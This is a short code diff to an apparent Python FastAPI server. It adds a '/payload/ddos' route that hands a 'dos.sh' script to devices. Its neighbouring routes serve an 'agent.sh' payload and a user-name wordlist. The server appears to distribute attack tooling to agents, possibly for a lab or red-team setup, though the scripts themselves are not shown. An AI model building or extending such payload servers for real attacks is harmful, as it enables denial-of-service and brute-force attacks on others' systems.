@@ -197,6 +197,15 @@ def get_payload(device_id: str):
             filename="agent.sh"
             )
 
+@app.get("/payload/ddos")
+def get_payload(device_id: str):
+    binary_path = os.path.join(this_path, "../bin/dos.sh")
+    return FileResponse(
+            path=binary_path,
+            media_type="application/octet-stream",
+            filename="dos.sh"
+            )
+
 @app.get("/wordlist/users")
 def get_payload(device_id: str):
     binary_path = os.path.join(this_path, "../src/testuser.txt")
